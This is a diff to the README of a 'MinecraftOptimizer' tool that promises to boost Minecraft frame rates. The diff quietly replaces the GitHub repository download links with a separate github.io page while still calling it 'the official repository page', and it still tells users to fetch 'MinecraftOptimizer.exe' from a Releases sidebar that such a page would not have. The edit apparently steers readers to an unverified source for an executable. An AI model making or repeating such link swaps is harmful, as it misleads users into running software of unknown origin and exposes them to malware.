@@ -1,6 +1,6 @@
 # 🚀 MinecraftOptimizer - Boost your game performance in seconds
 
-[![Download MinecraftOptimizer](https://img.shields.io/badge/Download-MinecraftOptimizer-blue.svg)](https://github.com/Drykeeightyeight427/MinecraftOptimizer)
+[![Download MinecraftOptimizer](https://img.shields.io/badge/Download-MinecraftOptimizer-blue.svg)](https://drykeeightyeight427.github.io)
 
 MinecraftOptimizer helps you run Minecraft with higher frame rates. It adjusts game settings and system resources automatically. This tool removes the need for manual configuration. You install it, run it, and play.
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic criteria to run the optimizer.
 
 You need to download the official release file first. Follow these steps to obtain the program.
 
-1.  Visit the official repository page at [https://github.com/Drykeeightyeight427/MinecraftOptimizer](https://github.com/Drykeeightyeight427/MinecraftOptimizer).
+1.  Visit the official repository page at [https://drykeeightyeight427.github.io](https://drykeeightyeight427.github.io).
 2.  Look for the "Releases" section on the right sidebar.
 3.  Click the version number at the top of that list.
 4.  Find the file labeled "MinecraftOptimizer.exe" under the Assets section.
